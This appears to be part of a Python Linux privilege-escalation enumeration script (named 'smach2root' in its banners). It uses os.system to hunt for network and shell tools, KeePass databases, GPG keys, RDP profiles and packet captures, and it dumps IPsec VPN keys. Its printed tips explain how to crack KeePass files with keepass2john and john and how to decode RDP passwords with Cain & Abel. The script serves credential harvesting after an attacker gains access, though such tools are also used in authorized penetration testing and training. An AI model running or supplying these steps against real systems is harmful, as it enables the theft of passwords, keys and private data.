os.system ('which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null | xargs ls -la')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Some of the tools have an exploit, do compgen -c to list all of the tools. Exploit:         ║")
print("\t║  https://gtfobins.github.io/                                                               ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Config Files:",XX)
os.system ("find / -iname *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always")
print("\n",BLUE,"[+] Bash Files 'Excluded /usr/ | /opt/':",XX)
os.system ('find / -iname *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"')
print("\n",BLUE,"[+] Python Files 'Excluded /usr/ | /opt/':",XX)
os.system ('find / -iname *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"')
print("\n",BLUE,"[+] PHP Files 'Excluded /usr/ | /opt/':",XX)
os.system ('find / -iname *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"')
print("\n",BLUE,"[+] Text Files:",XX)
os.system ('find / -iname *.txt 2>/dev/null | grep -v "/usr/\|/opt/\|/etc/\|/root/.*" | xargs ls -la --color=always 2>/dev/null')
print("\t╔═══════════════════════════════════════════════════════════════════════════════╗")
print("\t║smach2root search has excluded the following directory:-                       ║")
print("\t║  /usr/*       |  /opt/       |  /etc/       |  /root/.*                       ║")
print("\t╚═══════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] HTML Files 'Excluded /usr/':",XX)
os.system ('find / -iname *.html 2>/dev/null | grep -v "/usr/" | xargs ls -la --color=always 2>/dev/null')
print("\n",BLUE,"[+] .gpg Files:",XX)
os.system ("find / -iname *.gpg -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║A GPG file is a security key used to decrypt an encrypted file generated by GNU Privacy     ║")
print("\t║Guard (GnuPG), a file encryption program. The secure format is based on the OpenPGP         ║")
print("\t║standard defined by RFC2440,the same standard Pretty Good Privacy (.PGP) files use.         ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] KeePass database file:",XX)
print("[*] .kdbx files:")
os.system ("find / -iname *.kdbx -type f 2>/dev/null --color=always")
print("[*] .kdb files:")
os.system ("find / -iname *.kdb -type f 2>/dev/null --color=always")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║KeePass is a free open source password manager, which helps you to manage your passwords in ║")
print("\t║a secure way. You can store all your passwords in one database, which is locked with a      ║")
print("\t║master key. There are many exploits on the internet.                                        ║")
print("\t║",RED,"Exploit:",XX,"                                                                                ║")
print("\t║    ",RED,"Get the file to your local PC",XX,"                                                       ║")
print("\t║    ",RED,"keepass2john file.kdbx > hash",XX,"                                                       ║")
print("\t║    ",RED,"john hash",XX,"                                                                           ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Print IPSEC VPN Keys (requires root):",XX)
os.system ("ip xfrm state list")
print("\n",BLUE,"[+] OpenLDAP Configuration:",XX)
os.system ("cat /etc/openldap/ldap.conf 2>/dev/null")
print("\n",BLUE,"[+] Current user trash files:",XX)
os.system ("ls -la ~/.local/share/Trash/ 2>/dev/null")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Have a look at the trash files and see if you can find any useful information.              ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Wireshark files:",XX)
os.system ("find / -iname *.pcapng -type f 2>/dev/null --color=always")
os.system ("find / -iname *.libpcap -type f 2>/dev/null --color=always")
print("\n",BLUE,"[+] RDP Profiles:",XX)
os.system ("find / -iname *.RDP -type f 2>/dev/null --color=always")
os.system ("find / -iname *.rdp -type f 2>/dev/null --color=always")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Decode the RDP Password using Cain & Abel. So, open Cain & Adel the go to                   ║")
print("\t║  Tools > Remote Desktop Password Decoder $ then load the RDP profile to decode.            ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Modified Files Past 60 min:",XX)
os.system ("find /* -mmin -60 -xdev 2>/dev/null | grep -v '/proc/\|/sys/' | xargs ls -ld --color=always 2> /dev/null")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║It can be useful to check files that were modified recently, as they may be containing      ║")
print("\t║useful information and/or credentials.                                                      ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",RED,"\n\n\t\tEnumeration is completed ╔═══════════════════════════════════(100%)═══════════════════════════════════╗",XX,"         \n\n")
